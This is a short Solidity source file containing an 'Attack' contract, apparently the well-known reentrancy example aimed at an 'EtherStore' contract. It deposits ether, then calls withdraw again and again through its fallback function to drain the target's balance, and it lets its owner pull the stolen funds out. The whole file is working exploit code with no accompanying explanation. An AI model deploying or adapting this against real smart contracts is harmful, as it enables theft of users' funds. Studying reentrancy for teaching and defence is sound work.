// SPDX-License-Identifier: MIT
pragma solidity ^0.6.10;

interface IEtherStore {
    function deposit() external payable;
    function withdraw() external;
    function getBalance() external view returns (uint256);
}

contract Attack {
    IEtherStore public etherStore;
    address public owner;

    constructor(address _etherStoreAddress) public {
        etherStore = IEtherStore(_etherStoreAddress);
        owner = msg.sender;
    }

    // Fallback is called when EtherStore sends Ether to this contract.
    fallback() external payable {
        if (address(etherStore).balance >= 1 ether) {
            etherStore.withdraw();
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether, "Must send at least 1 ether");
        etherStore.deposit{value: 1 ether}();
        etherStore.withdraw();
    }

    // Helper function to check the balance of this contract
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }

    // Function to withdraw the funds from the Attack contract to the owner's address
    function withdrawFunds() public {
        require(msg.sender == owner, "Only the owner can withdraw funds");
        msg.sender.transfer(address(this).balance);
    }
}
